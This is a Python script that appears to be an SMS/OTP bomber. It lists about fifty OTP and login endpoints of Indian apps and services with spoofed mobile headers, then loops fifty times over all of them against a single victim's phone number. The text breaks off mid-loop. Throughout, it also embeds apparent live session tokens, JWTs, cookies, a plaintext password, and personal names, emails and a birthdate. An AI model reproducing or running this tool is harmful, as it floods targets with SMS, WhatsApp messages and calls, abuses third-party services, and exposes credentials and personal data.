import requests
import json
import time

def smsg(number):
    number = str(number)
    
 # List of APIs with their corresponding URLs, headers, and payloads
    
    apis = [   
        {
            "method": "POST",
            "url": "https://thanos.faasos.io/v3/customer/generate_otp.json?client_os=behrouz_android&app_version=10260&device_id=c7abc1fd7459e84c",
            "headers": {
                "Host": "thanos.faasos.io",
                "client-source": "13",
                "brand-id": "8",
                "app-version": "10260",
                "client-os": "behrouz_android",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.10.0"
            },
            "data": {
                "phone_number": number,
                "country_code": "IND",
                "dialing_code": "+91",
                "is_new_customer": True,
                "communication_channel": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://api.carselonadaily.com/api/customer/v2/login",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "authorization": "auth",
                "host": "api.carselonadaily.com"
            },
            "data": {
                "phone": number,
                "otpType": 0
            }
        },
        {
            "method": "POST",
            "url": "https://api.oyela.in/auth/generate_sms_otp",
            "headers": {
                "Host": "api.oyela.in",
                "accept": "application/json, text/plain, */*",
                "authorization": "",
                "clientdata": json.dumps({"platform": "mobile", "device_type": "android", "channel": "oyela-app", "app_version": "1.5.1"}),
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "phone": "+91"+number,
                "provider": "provider_3"
            }
        },
        {
            "method": "POST",
            "url": "https://mybillbook.in/api/request_otp",
            "headers": {
                "Host": "mybillbook.in",
                "authorization": "Bearer",
                "device-id": "c7abc1fd7459e84c",
                "client": "android",
                "accept": "application/json",
                "company-id": "",
                "language": "english",
                "client-version": "299",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.12.0"
            },
            "data": {
                "mobile_number": number,
                "otp_channel": "whatsapp"
            }
        },
        {
            "url": "https://www.gimbooks.com/v4/account/auth/get-otp/",
            "method": "POST",
            "headers": {
                "Host": "www.gimbooks.com",
                "content-type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "phone": number
            }
        },
        
        {
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {
                "Host": "api-gateway.juno.lenskart.com",
                "x-country-code-override": "IN",
                "accept-language": "en",
                "x-session-token": "ba761dad-180a-4dd5-b193-ef1c2e1bd142",
                "appversion": "4.2.6 (240405001)",
                "accept-encoding": "gzip",
                "x-build-version": "240405001",
                "api_key": "valyoo123",
                "x-accept-language": "en",
                "x-api-client": "android",
                "model": "SM-F7110",
                "x-b3-traceid": "1714497016147",
                "udid": "c7abc1fd7459e84c",
                "x-country-code": "IN",
                "brand": "samsung",
                "uniqueid": "18f2ffc5153c7abc",
                "content-type": "application/json",
                "x-app-version": "4.2.6 (240405001)",
                "user-agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)"
            },
            "data": {
                "phoneCode": "+91",
                "telephone": number
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "initiatePhoneOTP",
                    "phoneNumber": f"91{number}"
                }
            }
        },
        {
            "url": "https://asia-south1-tejimandiappprod.cloudfunctions.net/authentication",
            "method": "POST",
            "headers": {
                "Host": "asia-south1-tejimandiappprod.cloudfunctions.net",
                "firebase-instance-id-token": "cEXlLsEYRH618yR4549G-W:APA91bHqbZMG47XyQBse6Y2ukHIgwt6A2Pji1xHVQQQEQMhW3kU2YW8awqVwlhBruYh6aFbJuch4aVhYxDVDX7wRlLeUu6Vq35rrUHid5gzSIdt0709VucKzXFDZz8AktHhMK825P7Ns",
                "content-type": "application/json; charset=utf-8",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.6.0"
            },
            "data": {
                "data": {
                    "path": "resendOTP",
                    "phoneNumber": f"91{number}",
                    "userID": "",
                    "resendOTPCommunicationType": "whatsapp"
                }
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "guest_token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "user": {
                    "phone_number": f"+91{number}"
                },
                "invite_code": ""
            }
        },
        {
            "url": "https://api.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {
                "Host": "api.foxy.in",
                "accept": "application/json",
                "x-build-version": "10.6.5",
                "x-app-platform": "android",
                "x-guest-token": "8847daf0-0785-11ef-a442-bb8ba98df89f",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "user": {
                    "phone_number": f"+91{number}"
                },
                "via": "whatsapp"
            }
        },
        {
            "method": "POST",
            "url": "https://jarvis.divinetalk.live/api/v7/sendOtp",
            "headers": {
                "User-Agent": "Dart/3.4 (dart:io)",
                "Accept-Encoding": "gzip",
                "Content-Type": "application/json"
            },
            "data": {
                "mobile_no": number
            }
        },
        {
            "method": "POST",
            "url": "https://web-backend.biryanibykilo.com/backend-app/authentication/api/v2/send_otp",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJpc19ndWVzdCI6dHJ1ZSwidHMiOiIyMDI0LTA1LTAzIDA0OjM0OjU4Iiwic291cmNlIjoiYXBwIiwicmVmcmVzaF90cyI6IjIwMjQtMDUtMTMgMDQ6MzQ6NTgifQ.WCluN6-GDSQbK4C7cifxTALUf2gEqe03AuJMld4lDuE",
                "platform": "android",
                "appversion": "19.0.0",
                "x-access-token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "client-id": "bbk",
                "Content-Type": "application/json",
                "Content-Length": "329",
                "Host": "web-backend.biryanibykilo.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.10.0"
            },
            "data": {
                "mobile": number,
                "device_type": "app",
                "is_signup": False,
                "login_id": "",
                "firebase_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1ZDgzMzc5MS02ZjQ4LTRkYWQtYjNiYi0xY2ZiYjFjZDFjZmMiLCJ0cyI6IjIwMjQtMDUtMDMgMDQ6MzQ6NTgiLCJzb3VyY2UiOiJhcHAiLCJpc19ndWVzdCI6dHJ1ZX0.j73Jqp-gK34D_b86B8izUqapfe7FAnuM7_xkPf3BNJ8",
                "retry": False
            }
        },
        {
            "method": "POST",
            "url": "https://customerapp-gateway.porter.in/onboarding/customer/resend_otp/whatsapp",
            "headers": {
                "Host": "customerapp-gateway.porter.in",
                "country": "in",
                "preferred-languages": "{\"app_language\":\"en\"}",
                "brand": "porter",
                "source": "android",
                "version-name": "5.69.2",
                "custom-app-version-code": "242",
                "client-request-uuid": "14ded413-164b-411e-99eb-7ff33ae4ad49",
                "installation-id": "0fe7940e-b9df-46d0-83bf-a59b7645b79b",
                "app-session-id": "3b06ceaf-726c-4bd9-97de-01d5e45c74ab",
                "accept-charset": "UTF-8",
                "accept": "*/*",
                "user-agent": "Ktor client",
                "content-type": "application/json",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "mobile": number,
                "organizationId": "64254d66be2a390018e6d348"
            }
        },
        {
            "method": "POST",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "headers": {
                "authorization": "Bearer",
                "client-id": "64254d66be2a390018e6d348",
                "client-version": "50028",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.123 Mobile Safari/537.36",
                "randomid": "c7abc1fd7459e84c",
                "client-type": "MOBILE",
                "device-meta": '{"APP_VERSION":"50028","APP_VERSION_NAME":"23.6.5","DEVICE_MAKE":"Samsung","DEVICE_MODEL":"SM-F7110","OS_VERSION":"14","PACKAGE_NAME":"com.owebso.svs.xylemlern","network":"mobile_data","carrier":"UNDEFINED"}',
                "referer": "https://android.pw.live",
                "content-type": "application/json; charset=UTF-8",
                "accept-encoding": "gzip"
            },
            "data": {
                "firstName": "shiva",
                "lastName": "",
                "mobile": number,
                "countryCode": "+91"
            }
        },
        {
            "method": "POST",
            "url": "https://api.hogr.app/api/apigateway?api=generateotp",
            "headers": {
                "user-agent": "Dart/3.3 (dart:io)",
                "content-type": "application/json",
                "accept-encoding": "gzip",
                "host": "api.hogr.app",
                "Content-Length": "225"
            },
            "data": {
                "phone": f"+91{number}",
                "can_whatsapp_messages": True,
                "pk": "f6mx-A0_SGK_UxnbwVi2kN:APA91bEgFLmpvykAXsU0owL35Uzjogpl6WLxU53GY2X0VLxuA-FQ5W5lO7dmRUaX2tnwTRFELrGPuDfMGsqFLoqUNeyzaQKi7ka2GiXxQ-yytVRe6vEq0yyQdb-3uPBRF_0NjzGfl0B6"
            }
        },
        {
            "url": "https://api.toolsvilla.com/web/register",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": {"firstname": "", "mobileno": number, "email": "", "wtpSubs": True}
        },
        {
            "url": "https://api.rummyculture.com/api/auth/generateOtp",
            "method": "POST",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"mobile": number, "verificationChannel": "5", "medium": "SMS"}
        },
        {
            "url": "https://api.rummyculture.com/api/auth/generateOtp",
            "method": "POST",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {"mobile": number, "verificationChannel": "5", "medium": "WHATSAPP"}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        },
        {
            "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&isResend=true",
            "method": "POST",
            "headers": {
                "User-Agent": "Udaan-Android-App/70350 7.35/4744 (14;Android) (samsung;lahaina;;SM-F7110;)",
                "Content-Type": "application/x-www-form-urlencoded",
                "accept-encoding": "gzip",
                "origin": "https://auth.udaan.com",
                "x-requested-with": "com.udaan.android"
            },
            "data": {"mobile": number}
        },
        {
            "method": "POST",
            "url": "https://user-onboarding-api-live.utec-build.com/userOnboardingService/generateOtp",
            "headers": {
                "Keep-Alive": "timeout=90, max=99",
                "Cache-Control": "no-cache",
                "Accept": "application/json",
                "App-Version": "V4",
                "Service-Session-Identifier": "256DF272EEBF45B9B06CC0D69D02907B_1716346615006",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 14; V2250 Build/UP1A.231005.007)",
                "Host": "user-onboarding-api-live.utec-build.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "Content-Length": "39"
            },
            "data": {
                "appId": 1,
                "mobileNumber": number
            }
        },
        {
            "method": "POST",
            "url": "https://v1.pro.rechargecube.in/auth/login/otp",
            "headers": {
                "Host": "v1.pro.rechargecube.in",
                "authorization": "",
                "content-type": "application/json",
                "content-length": "23",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.9.2"
            },
            "data": {
                "mobile": number
            }
        },
        {
            "method": "POST",
            "url": "https://www.dream11.com/auth/passwordless/init",
            "headers": {
                "Host": "www.dream11.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "85",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "phoneNumber": number,
                "templateName": "default",
                "channel": "sms",
                "flow": "SIGNIN"
            }
        },
        {
            "method": "POST",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "headers": {
                "Host": "production.apna.co",
                "content-type": "application/json; charset=utf-8",
                "content-length": "88",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "retries": 0.0,
                "phone_number": f"91{number}",
                "source": "employer",
                "hash_type": "employer"
            }
        },
        {
            "method": "POST",
            "url": "https://prod.hirect.ai/hirect/login/otp",
            "headers": {
                "Host": "prod.hirect.ai",
                "x-timestamp": "1714759344812",
                "x-appversion": "3.5.5",
                "x-os": "android",
                "x-osversion": "14",
                "x-bundleid": "in.hirect",
                "x-deviceid": "c7abc1fd7459e84c",
                "x-model": "SM-F7110",
                "x-brand": "samsung",
                "x-widthpixels": "1260",
                "x-heightpixels": "2624",
                "x-dpi": "480",
                "x-appversioncode": "248",
                "x-api": "34",
                "x-mac": "12:34:56:61:23:6b",
                "x-language": "en",
                "x-fcmtoken": "cMnhKeWTSY-g3j7-E0jLWj:APA91bFV4oKivSAG3YhXZuT06fcP3G-0hSrfmGVfxYtqLS6Uae42OfETSk02f9sfotwxEhdrhhW2W9Ii0RMwG8zFIL8mJVgSj-3zaWYUl9Oa1x3VFHHf21eiO3aB133gVQ2W95O_9MyR",
                "x-region": "in",
                "x-role": "2",
                "x-androidid": "dDgo6im6ex6lHKrb6jwfgzqyNeX17l7aBZ7yYMk7pNQ=",
                "x-channel": "web",
                "x-networktype": "0",
                "x-timezone": "Asia/Calcutta",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "35",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/4.8.0"
            },
            "data": {
                "mobile": f"+91{number}",
                "type": 1
            }
        },
        {
            "method": "POST",
            "url": "https://clicktobuy.hyundai.co.in/ctb/bank/generateOtpForAuthentication.ctb",
            "headers": {
                "Content-Type": "application/json; charset=utf-8",
                "Content-Length": "24",
                "Host": "clicktobuy.hyundai.co.in",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            },
            "data": {
                "cstmMob": number
            }
        },
        {
            "method": "POST",
            "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
            "headers": {
                "Host": "www.rummycircle.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "88",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "otpOnCall": True,
                "mobile": number,
                "otpType": 8.0,
                "transactionId": 1.708139023656E12
            }
        },
        {
            "method": "POST",
            "url": "https://shop.havells.com/graphql",
            "headers": {
                "Host": "shop.havells.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "191",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "variables": {
                    "mobile": number
                },
                "query": """mutation sendOtp($mobile: String!) {
  sendOtp(mobile: $mobile) {
    mobile
    message
    __typename
  }
}""",
                "operationName": "sendOtp"
            }
        },
        {
            "method": "POST",
            "url": "https://micro.banksathi.com/api/v1/auth_user/initinate_otp",
            "headers": {
                "Host": "micro.banksathi.com",
                "content-type": "application/json; charset=utf-8",
                "content-length": "92",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.9.1"
            },
            "data": {
                "device_id": "",
                "whatsaap_consent": False,
                "mobile_no": number,
                "condition_accepted": True
            }
        },
        {
            "method": "POST",
            "url": "https://gateway.credmudra.com/public/send-otp",
            "data": {
                "data": {
                    "contactNo": number,
                    "resend": False,
                    "anonymousId": "65d48590cbf0720f6eec2505"
                }
            },
            "headers": {
                "Host": "gateway.credmudra.com",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://api.prod.oziva.in/nitro/send/",
            "data": {
                "phone": number,
                "source": "order_management",
                "type": "sms"
            },
            "headers": {
                "Host": "api.prod.oziva.in",
                "Content-Type": "application/json; charset=utf-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/3.9.1"
            }
        },
        {
            "method": "POST",
            "url": "https://prod.hirect.ai/hirect/login/otp",
            "data": {
                "mobile": number,
                "type": 3
            },
            "headers": {
                "Host": "prod.hirect.ai",
                "x-timestamp": "1714835211967",
                "x-appversion": "3.5.5",
                "x-os": "android",
                "x-osversion": "14",
                "x-bundleid": "in.hirect",
                "x-deviceid": "c7abc1fd7459e84c",
                "x-model": "SM-F7110",
                "x-brand": "samsung",
                "x-widthpixels": "1260",
                "x-heightpixels": "2624",
                "x-dpi": "480",
                "x-appversioncode": "248",
                "x-api": "34",
                "x-mac": "12:34:56:61:23:6b",
                "x-language": "en_US",
                "x-fcmtoken": "cMnhKeWTSY-g3j7-E0jLWj:APA91bFV4oKivSAG3YhXZuT06fcP3G-0hSrfmGVfxYtqLS6Uae42OfETSk02f9sfotwxEhdrhhW2W9Ii0RMwG8zFIL8mJVgSj-3zaWYUl9Oa1x3VFHHf21eiO3aB133gVQ2W95O_9MyR",
                "x-region": "in",
                "x-role": "2",
                "x-androidid": "dDgo6im6ex6lHKrb6jwfgzqyNeX17l7aBZ7yYMk7pNQ=",
                "x-channel": "web",
                "x-networktype": "0",
                "x-timezone": "Asia/Calcutta",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.8.0"
            }
        },
        {
            "method": "POST",
            "url": "https://www.vidyakul.com/api/v1/login",
            "data": {
                "phone_number": number,
                "version_number": "6.0.5.9",
                "fcm_token": "fWSFkvMaQoi_btSsaHlMd2:APA91bE_AXYYAutauBN_fegTv7CiMWw0z2zylXgyq9792ra7ou4VfTJ3nI4gPFpla1AEIN_rtmgwqk9rL5DoldqjcmKdJeGIGDI6_p-rhE9xVLqCjVFaTE9tanuuccEhsuUTHhGkNVzl"
            },
            "headers": {
                "Host": "www.vidyakul.com",
                "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOjIyMDUxOSwiaXNzIjoiaHR0cDovL3d3dy52aWR5YWt1bC5jb20vYXBpL3YxL2xvZ2luIiwiaWF0IjoxNzE0NzQ0OTIxLCJleHAiOjE3MTczMzY5MjEsIm5iZiI6MTcxNDc0NDkyMSwianRpIjoiNEJsbFZZSFdpRnhPc1poRyJ9.xQSAIQdB4YeEgtbOa61WQj4MhzXxge5Cea3jzPEfRbc",
                "Content-Type": "application/json; charset=UTF-8",
                "Accept-Encoding": "gzip",
                "User-Agent": "okhttp/4.9.3"
            }
        },
        {
            "url": "https://asset-transaction-api.rupyy.com/send/otp-v2",
            "method": "POST",
            "headers": {
                "Host": "asset-transaction-api.rupyy.com",
                "content-length": "128",
                "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"',
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36",
                "sec-ch-ua-platform": "Android",
                "origin": "https://www.rupyy.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.rupyy.com/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            },
            "data": {
                "referenceId": number,
                "mobile": number,
                "type": "otp",
                "value": None,
                "product": "personalLoan",
                "retries": 1,
                "extraInfo": {}
            }
        },
        {
            "url": "https://unakotimart.com/public/api/generate-otp-for-login",
            "method": "POST",
            "headers": {
                "Host": "unakotimart.com",
                "content-length": "61",
                "sec-ch-ua": '"Android WebView";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                "accept": "application/json, text/plain, */*",
                "content-type": "application/json;charset=UTF-8",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.42 Mobile Safari/537.36",
                "sec-ch-ua-platform": "Android",
                "origin": "https://unakotimart.com",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://unakotimart.com/login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9",
                "cookie": "_ga=GA1.2.883798140.1712546446; _gid=GA1.2.1908890046.1712546471; _gat=1; _ga_R2VH04Z60R=GS1.1.1712546446.1.1.1712546488.0.0.0"
            },
            "data": {
                "phone": f"+91{number}",
                "email": "shivamyou662@gmail.com"
            }
        },
        {
            "url": "https://v2-api.bankopen.co/users/register/otp",
            "method": "POST",
            "headers": {
                "Host": "v2-api.bankopen.co",
                "content-length": "45",
                "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Android WebView";v="122"',
                "x-api-version": "3.1",
                "sec-ch-ua-mobile": "?1",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "x-client-type": "Web",
                "baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=08b4ebc206c84d3cbe6e8f38565ed92f",
                "sentry-trace": "08b4ebc206c84d3cbe6e8f38565ed92f-b5d07f68050b9a91-1",
                "sec-ch-ua-platform": "Android",
                "origin": "https://app.opencapital.co.in",
                "x-requested-with": "pure.lite.browser",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://app.opencapital.co.in/en/onboarding/login?utm_source=google&utm_medium=cpc&utm_campaign=IYD_Businessloans&utm_term=best%20loan%20app&gad_source=1&gclid=EAIaIQobChMIrP-6nKeIhQMVLBKDAx3JcwcPEAMYASAAEgKThPD_BwE",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en-US,en;q=0.9"
            },
            "data": {
                "username": number,
                "is_open_capital": 1
            }
        },
        {
    "url": "https://apis.monginis.net/api/register",
    "method": "POST",
    "headers": {
        "Host": "apis.monginis.net",
        "Connection": "keep-alive",
        "Content-Length": "126",
        "sec-ch-ua": "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://cakesonline.monginis.net",
        "X-Requested-With": "pure.lite.browser",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://cakesonline.monginis.net/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "_gcl_au=1.1.1722287105.1714412869; _gid=GA1.2.1245384354.1714412869; _ga_ZYCBGPY2VS=GS1.1.1714412869.1.0.1714412869.60.0.0; _fbp=fb.1.1714412871917.1912131249; _hjSession_2781155=eyJpZCI6ImQxYzY4ZWQxLWI1NjUtNDBmNS05MDEyLTU4NTg4NTJhNWE4MCIsImMiOjE3MTQ0MTI4Nzg1MDgsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; monginis_session=bbzi0TCYqvXtZueNbZl0qAe0zueWjb3kTerHnxvj; _ga=GA1.2.2038256619.1714412869; _hjSessionUser_2781155=eyJpZCI6IjM5YjNhOWE2LTkwZTMtNTI1Mi1iMjA0LTk0MjIxNGViN2JjNCIsImNyZWF0ZWQiOjE3MTQ0MTI4Nzg1MDIsImV4aXN0aW5nIjp0cnVlfQ==; _ga_5HS0WWXH8T=GS1.1.1714412877.1.1.1714412908.29.0.806772904"
    },
    "data": {
        "first_name": "shivam",
        "last_name": "rajput",
        "mobile_number": number,
        "email": "shivamyo6200@gmail.com",
        "dob": "2003-04-29"
    }
},
{
    "url": "https://mrbrownbakery.com/public/api/reactotp",
    "method": "POST",
    "headers": {
        "Host": "mrbrownbakery.com",
        "Connection": "keep-alive",
        "Content-Length": "23",
        "sec-ch-ua": "\"Android WebView\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Authorization": "Bearer",
        "User-Agent": "Mozilla/5.0 (Linux; Android 14; V2250 Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/123.0.6312.120 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "Origin": "https://m.mrbrownbakery.com",
        "X-Requested-With": "pure.lite.browser",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://m.mrbrownbakery.com/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9"
    },
    "data": {
        "mobile": number
    }
},
{
        "url": "https://api.thesouledstore.com/api/v2/register-otp?platform=web",
        "method": "POST",
        "data": {
            "firstname": "Shivam",
            "lastname": "Rajput",
            "email": "shivamrajput6627@gmail.com",
            "password": "alagauwu@27",
            "telephone": number,
            "birthdate": "",
            "gender": "M",
            "token": ""
        }
    },
    {
        "url": "https://api.thesouledstore.com/api/v2/resend-otp-register?platform=web",
        "method": "POST",
        "data": {"telephone": number}
    },
    {
        "url": "https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/",
        "method": "POST",
        "data": {
            "action": "generate",
            "phone": number,
            "access": "signup"
        }
    },
    {
        "url": "https://webapi.byjusexamprep.com/user/verify/sendOtp",
        "method": "POST",
        "data": {
            "deviceType": "web",
            "viaWhatsapp": False,
            "tel": "+91"+number
        }
    },
    {
        "url": "https://api.playo.io/onboard/generateOTP",
        "method": "POST",
        "data": {"countryCode": "+91", "mobile": number}
    },
    {
        "url": "https://app.ludosupreme.com/v1.0/user/requestSignupOtp",
        "method": "POST",
        "data": {"phoneNumber": number, "appPackageName": "in.ludo.supremegold"}
    },
    
    {
        "url": "https://www.cuemath.com/api/v4/login/",
        "method": "POST",
        "data": {
            "country_code": "91",
            "phone": number,
            "action": "get_otp",
            "flow": "login"
        }
    },
    {
        "url": "https://www.roposo.com/v3/auth/checkphonenumber",
        "method": "POST",
        "data": {"mode": 5.0, "phonenumber": "+91"+number}
    },
    {
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "data": {"mobile": number}
    }
    
        
        
    ]
    
    # Run the requests for 20 times
    for _ in range(50):
        for api in apis:
            if api["method"] == "GET":
                response = requests.get(api["url"], params=api.get("params", {}), headers=api.get("headers", {}))
            elif api["method"] == "POST":
                response = requests.post(api["url"], json=api.get("data", {}), headers=api.get("headers", {}))
            elif api["method"] == "PUT":
